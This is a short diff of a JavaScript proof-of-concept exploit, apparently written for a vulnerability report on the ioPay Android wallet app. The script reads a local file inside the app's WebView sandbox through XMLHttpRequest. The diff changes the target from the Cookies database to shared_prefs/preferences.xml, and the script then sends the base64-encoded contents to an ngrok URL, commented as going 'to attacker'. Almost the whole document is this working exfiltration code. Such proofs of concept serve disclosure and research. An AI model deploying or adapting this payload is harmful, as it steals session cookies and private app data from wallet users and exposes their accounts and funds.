@@ -47,10 +47,10 @@
    // </script>
 
 <script>
-    var url = 'file:///data/user/0/io.iotex.iopay.gp/app_webview/Default/Cookies'; //local filefunction load(url) {
+    var url = 'file:///data/user/0/io.iotex.iopay.gp/shared_prefs/preferences.xml'; //local filefunction load(url) {
         var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
-            fetch('https://1c4f-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
+            fetch('https://1626-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
             }
         }xhr.open('GET', url, true);
         xhr.send('');
